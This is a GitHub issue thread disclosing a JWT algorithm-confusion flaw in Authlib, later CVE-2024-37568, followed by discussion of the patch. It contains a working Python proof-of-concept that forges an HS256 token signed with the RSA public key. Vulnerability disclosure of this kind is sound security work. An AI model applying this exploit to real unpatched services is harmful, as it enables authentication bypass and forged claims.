### **[milliesolem](/milliesolem)** commented [Jun 3, 2024](#issue-2331218331)

| Issue description If the `algorithm` field is left unspecified when calling `jwt.decode`, the library will allow HMAC verification with ANY asymmetric public key. The library does no checks whatsoever to mitigate this. This applies to verification with the algorithms HS256, HS384, and HS512 in lieu of the asymmetric algorithm. This issue is also persistent in [joserfc](https://github.com/authlib/joserfc). This vulnerability is similar to [CVE-2022-29217](https://github.com/advisories/GHSA-ffqj-6fqr-9h24 "CVE-2022-29217") and [CVE-2024-33663](https://github.com/advisories/GHSA-6c5p-j8vq-pqhj "CVE-2024-33663"), however severity is higher as this applies to ALL verification with asymmetric public keys, regardless of format.  The [Authlib documentation on JWTs](https://docs.authlib.org/en/latest/jose/jwt.html) starts off with a code snippet demonstrating JWT signing and verfication of claims using RSA. The code snippet shown is vulnerable to this issue. The documetation does halfway down the page go on to describe the danger of not checking the algorithm header, however does not adequately press the importance of not doing so, nor does the library implement adequate protections against this. Proposed solution Same solution as for the patch for [CVE-2022-29217](https://github.com/advisories/GHSA-ffqj-6fqr-9h24 "CVE-2022-29217") and [CVE-2024-33663](https://github.com/advisories/GHSA-6c5p-j8vq-pqhj "CVE-2024-33663"). A thorough, comprehensive check of whether the verifying key is asymmetric, see [here](https://github.com/jpadilla/pyjwt/blob/7b4bc844b9d4c38a8dbba1e727f963611124dd5b/jwt/utils.py#L100). When performing signature verification with HMAC, first check whether the verifying key is not actually a PEM or SSH-encoded asymmetric public key; this is a clear sign of algorithm confusion.  Also make non-usage of the algorithms keyword throw an exception when using the `jwt.decode` method, or at the very least a warning, so that the developer at least knows they are doing something silly by not using it. Alternatively, depricate the method an instead only allow usage of the `JsonWebToken` class, with algorithm as a mandatory parameter and disallow usage of multiple algorithms in a single instance. Proof-of-Concept Here is a simplified Proof-of-Concept using pycryptodome for key generation that illustrates one way this could be exploited  ``` from authlib.jose import jwt from Crypto.PublicKey import RSA from Crypto.Hash import HMAC, SHA256 import base64  # ----- SETUP -----  # generate an asymmetric RSA keypair # !! signing should only be possible with the private key !! KEY = RSA.generate(2048)  # PUBLIC KEY, AVAILABLE TO USER # CAN BE RECOVERED THROUGH E.G. PUBKEY RECOVERY WITH TWO SIGNATURES: # https://crypto.stackexchange.com/questions/26188/rsa-public-key-recovery-from-signatures # https://github.com/FlorianPicca/JWT-Key-Recovery PUBKEY = KEY.public_key().export_key(format='PEM')  # Sanity check PRIVKEY = KEY.export_key(format='PEM') token = jwt.encode({"alg": "RS256"}, {"pwned":False}, PRIVKEY) claims = jwt.decode(token, PUBKEY) assert not claims["pwned"]  # ---- CLIENT SIDE -----  # without knowing the private key, a valid token can be constructed # YIKES!!  b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'') payload = b64(b'{"alg":"HS256"}') + b'.' + b64(b'{"pwned":true}') hasher = HMAC.new(PUBKEY, digestmod=SHA256) hasher.update(payload) evil_token = payload + b'.' + b64(hasher.digest()) print("😈",evil_token)  # ---- SERVER SIDE -----  # verify and decode the token using the public key, as is custom # algorithm field is left unspecified # but the library will happily still verify without warning, trusting the user-controlled alg field of the token header data = jwt.decode(evil_token, PUBKEY) if data["pwned"]:     print("VULNERABLE") ``` Disclaimer As per the security policy, I contacted both the author and Tidelift about this issue in early April of this year. I received a response from Tidelift that they would follow up the issue, however the issue remains unpatched and I have still not heard further from either. As such, I am opening a public issue on this vulnerability. |

| This vulnerability is now tracked under [CVE-2024-37568](https://github.com/advisories/GHSA-5357-c2jx-v7qh "CVE-2024-37568").  After testing, the patch provided in 1.3.1 *seems* adequate for any imminent exploitation of the vulnerability. However, for future releases, I would recommend the following:   1. Also make the algorithms field mandatory when decoding, or at the very least throw a warning when not used. The current patch resisted initial security testing by me, but there may be key formats not accounted for. Solving the root cause of this issue would be preferable. 2. Improve the error message when doing HMAC verification with a public key to more explicitly say what the problem is. I don't think the message "This key may not be safe to import" is adequately intuitive to help developer understand if their usage of the library is secure or not. A message such as "Asymmetric key formats may not be used with HMAC verification" would be much better.   Closing issue in faith that the above gets addressed in time.

| [@stigtsp](https://github.com/stigtsp) It *seems* fixed, the patch basically introduces a blocklist of public key formats when verifying with HMAC. I was not able to bypass this blocklist. But the patch could be much improved by requiring the developer to specify which algorithm is to be used (see patch for [CVE-2022-29217](https://github.com/advisories/GHSA-ffqj-6fqr-9h24 "CVE-2022-29217")). That way we would know for sure, rather than hoping the blocklist is comprehensive. |

| [@stigtsp](https://github.com/stigtsp) [@milliesolem](https://github.com/milliesolem) it is a little hard to keep the compatibility while improve the security. I've changed the behavior in `joserfc`, you should not pass a string or bytes as the key now.  <https://jose.authlib.org/en/> <https://github.com/authlib/joserfc/blob/main/src/joserfc/jwk.py#L81> |
